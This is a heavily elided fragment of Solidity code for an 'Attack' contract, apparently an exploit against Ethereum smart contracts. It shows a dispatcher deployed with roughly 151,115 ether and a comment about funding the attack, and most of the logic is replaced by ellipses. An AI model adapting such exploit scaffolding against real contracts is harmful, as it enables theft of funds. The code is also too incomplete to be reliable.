 ...
 * parameter. Make sure to send at least 151115 ether and 727451828646838273 wei to the attack
    ...
    function _dispatch() public returns(bool) {
        ...
        if (state == 0) {
            if (id == 0) {
                ...
                uint value = 0x20000000000000000000;
...
contract Attack is AttackManager {
    ...
    uint constant REQUIRED_BUDGET = 0x20000000000000000001; /* equals 151115 ether and 727451828646838273 wei */
    ...
    function reset(address payable[] memory _targets) public onlyOwner payable {
        ...
        rstate_state = 0;
        rstate[0] = 0;
        subs[0] = new AttackDispatcher{value: 151115727451828646838272 }(0, _targets);
    }
